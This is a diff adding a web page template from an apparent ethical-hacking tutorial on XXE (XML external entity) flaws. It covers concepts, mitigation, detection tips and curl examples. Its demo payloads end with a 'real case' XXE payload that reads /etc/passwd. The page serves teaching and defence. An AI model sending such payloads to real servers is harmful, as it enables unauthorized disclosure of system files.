@@ -1,0 +1,204 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XEE (XXE) — Usage & Mitigation</title>
+  <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+
+  <h1>What is XEE (aka <code>XXE</code>)?</h1>
+  <p class="common">
+    XEE/XXE (XML External Entity) is a class of XML parser misconfigurations where user-supplied XML can reference
+    external resources (files/URLs). If a parser resolves those references, it can disclose sensitive data or make
+    unintended network requests.
+  </p>
+  <ul>
+    <li>Root cause: XML parser allows <code>&lt;!DOCTYPE … &gt;</code> with external entities (e.g. <code>SYSTEM</code>/<code>PUBLIC</code>).</li>
+    <li>Impact: file disclosure, SSRF, error-based leaks; in rare cases, DoS via large entity expansion.</li>
+    <li>Fix: disable DTDs & external entity resolution by default; validate strictly; prefer safer data formats.</li>
+  </ul>
+
+  <h1>Core Concepts</h1>
+  <table>
+    <thead>
+      <tr><th>Term</th><th>Meaning</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>DTD</td>
+        <td>Document Type Definition; can declare entities. Dangerous when enabled for untrusted XML.</td>
+      </tr>
+      <tr>
+        <td>External Entity</td>
+        <td>Entity whose value comes from an external resource (<code>SYSTEM "file:///…"</code> or URL).</td>
+      </tr>
+      <tr>
+        <td>Parameter Entity</td>
+        <td>DTD-scoped entity (starts with <code>%</code>); also risky if processed.</td>
+      </tr>
+      <tr>
+        <td>XXE</td>
+        <td>Exploitation of a parser that resolves external entities.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h1>The Flow (at a glance)</h1>
+  <div class="list">
+    <h3 class="blue">Parser accepts DTD → External entity resolves → Sensitive data/requests leak</h3>
+    <ul>
+      <li>Application receives XML from client</li>
+      <li>Parser processes <code>&lt;!DOCTYPE&gt;</code> and resolves <code>SYSTEM</code>/<code>PUBLIC</code> entity</li>
+      <li>Entity value is inserted into XML tree → may disclose file content or trigger outbound request</li>
+    </ul>
+  </div>
+
+  <h1>Safe Demo Payloads (for authorized test envs)</h1>
+
+  <h2 class="blue">1) Minimal XML with external entity</h2>
+  <div class="code-box"><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE note [
+  &lt;!ENTITY test SYSTEM "file:///path/to/a/harmless/test.txt"&gt;
+]&gt;
+&lt;note&gt;&amp;test;&lt;/note&gt;
+</code></pre></div>
+
+  <h2 class="blue">2) POST an XML body (common)</h2>
+  <div class="code-box"><pre><code>kali@kali:~ $ <u>curl https://target.example.com/api/xml</u> \
+  <u>-H "Content-Type: application/xml"</u> \
+  <u>--data-binary @payload.xml</u>
+</code></pre></div>
+
+  <h2 class="blue">3) GET with XML param (less common)</h2>
+  <div class="code-box"><pre><code>kali@kali:~ $ <u>curl -G "https://target.example.com/api" \</u>
+  <u>--data-urlencode 'xml=&lt;?xml version="1.0"?&gt;&lt;root/&gt;'</u>
+</code></pre></div>
+
+  <p class="common"><span class="separate">Important:</span> Only test on systems you own or have explicit permission to assess. Use innocuous file paths in labs (e.g., a benign test file you create).</p>
+
+  <h1>Reading Responses</h1>
+  <ul>
+    <li>If the entity is resolved, its value may appear in the normal response or in error messages.</li>
+    <li>Some apps normalize or strip XML; watch server logs and error traces during testing (authorized only).</li>
+  </ul>
+
+  <h1>Mitigation (High-Level)</h1>
+  <table>
+    <thead>
+      <tr><th>Platform</th><th>What to disable</th><th>Notes</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>General XML parsers</td>
+        <td>Disallow DTDs; disable external entity resolution (both general & parameter entities)</td>
+        <td>Reject any input containing <code>&lt;!DOCTYPE&gt;</code> unless absolutely required</td>
+      </tr>
+      <tr>
+        <td>App logic</td>
+        <td>Use strict schemas; prefer JSON where possible</td>
+        <td>Whitelist expected fields; reject unexpected nodes</td>
+      </tr>
+      <tr>
+        <td>Network</td>
+        <td>Block outbound egress from app containers</td>
+        <td>Prevents SSRF-style XXE impact</td>
+      </tr>
+      <tr>
+        <td>Secrets handling</td>
+        <td>Never store secrets in web-readable paths</td>
+        <td>Use vaults; least-privilege FS permissions</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h1>Detection Tips</h1>
+  <ul>
+    <li>Endpoints that accept XML (<code>Content-Type: application/xml</code> or <code>text/xml</code>)</li>
+    <li>Error messages mentioning DTD, DOCTYPE, entities, or parser features</li>
+    <li>Unexpected outbound DNS/HTTP requests from the app (in controlled tests)</li>
+  </ul>
+
+  <h1>Quick Reference</h1>
+  <table>
+    <thead>
+      <tr><th>Check</th><th>Command / Hint</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Does the API accept XML?</td>
+        <td><code>curl -I https://target/api</code> → look for <code>Accept</code> / docs</td>
+      </tr>
+      <tr>
+        <td>Send XML safely</td>
+        <td><code>curl -H "Content-Type: application/xml" --data-binary @payload.xml https://target/api</code></td>
+      </tr>
+      <tr>
+        <td>Compare behavior with & without DOCTYPE</td>
+        <td>Create two payloads; diff responses, errors, timing</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h1>Safety</h1>
+  <ul>
+    <li>Use dedicated lab targets or explicit scopes; log consent.</li>
+    <li>Prefer benign test files and non-network entities during basic checks.</li>
+    <li>If you find a real issue, follow responsible disclosure guidelines.</li>
+  </ul>
+
+
+
+
+  <h2 class="blue">4) Detect XML format/type from a URL</h2>
+<div class="code-box"><pre><code>kali@kali:~ $ <u>curl -s https://0xdf.gitlab.io/feed.xml</u> | <u>xmllint --format -</u> | <u>head -16</u></code></pre></div>
+
+<h3>What this does</h3>
+<ul>
+  <li><code>curl -s</code> quietly downloads the XML.</li>
+  <li><code>xmllint --format -</code> pretty-prints from STDIN (and errors if not well-formed).</li>
+  <li><code>head -16</code> shows the XML declaration and the root element so you can identify the type.</li>
+</ul>
+
+<h3>What to look for in the first lines</h3>
+<div class="code-box"><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;feed xmlns="http://www.w3.org/2005/Atom"&gt;          ← Atom feed
+# or:
+&lt;rss version="2.0"&gt;                                  ← RSS 2.0
+# or:
+&lt;rdf:RDF xmlns="http://purl.org/rss/1.0/"&gt;          ← RSS 1.0 (RDF)
+# or:
+&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;  ← XML Sitemap
+# or:
+&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;  ← SOAP
+</code></pre></div>
+
+<h3>Optional: get only the root element name</h3>
+<div class="code-box"><pre><code>kali@kali:~ $ <u>curl -s https://0xdf.gitlab.io/feed.xml</u> | <u>xmllint --xpath 'name(/*)' -</u>; echo
+feed
+</code></pre></div>
+
+<h3>Troubleshooting</h3>
+<ul>
+  <li>If you see “parser error”, the response may not be XML (check with <code>curl -I &lt;URL&gt;</code> for <code>Content-Type</code>).</li>
+  <li>Compressed content? Try <code>curl -s --compressed &lt;URL&gt;</code>.</li>
+  <li>Redirects? Add <code>-L</code> to <code>curl</code>.</li>
+</ul>
+
+
+
+<h2 class="blue">5) XEE File Real Case</h2>
+<div class="code-box"><pre><code>&lt;!--?xml version="1.0" ?--&gt;
+&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;entry&gt;
+&lt;Author&gt;xee&lt;/Author&gt;
+&lt;Subject&gt;&xxe&lt;/Subject&gt;
+&lt;Content&gt;Test&lt;/Content&gt;
+&lt;/entry&gt;
+</code></pre></div>
+
+</body>
+</html>
